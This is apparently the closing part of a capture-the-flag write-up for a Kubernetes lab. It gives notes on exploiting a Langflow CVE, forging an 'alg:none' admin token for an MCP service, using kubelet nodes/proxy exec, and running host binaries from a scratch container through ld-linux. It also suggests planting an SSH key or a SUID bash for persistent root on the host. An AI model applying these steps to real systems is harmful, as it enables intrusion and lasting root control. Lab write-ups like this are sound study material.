**Full root, arbitrary host read/write:** swap `cat` for any host binary via the same `ld-linux + --library-path`
invocation (e.g. write an SSH key to `/host/root/root/.ssh/authorized_keys`, or `chmod u+s /host/root/bin/bash`
to drop a persistent SUID root shell on the host).

---

## Notes / gotchas
- **Endpoint:** use the site root for the Langflow CVE; `/playground/` returns 405.
- **MCP:** `alg:none` needs the exact `{"role":"admin"}` claim; tool `code` runs as `python3 -c`, invoke args go to stdin.
- **`nodes/proxy`:** `get` is enough for exec **only via GET** on the kubelet `/exec` (POST wants `create`).
- **scratch container:** no shell — drive the host's dynamically-linked binaries through `ld-linux-x86-64.so.2 --library-path <host libs>`.
- **websocat:** pass headers with the `-H='...'` (equals) form; keep stdin open (`sleep N | websocat`) to receive output.
- **Reset-variable values:** target IP, tun0 IP, flags, and the live `node-exporter` pod suffix all change per instance; the `flow_id`, MCP creds, `.env` password, and the `alg:none` admin token are static.

```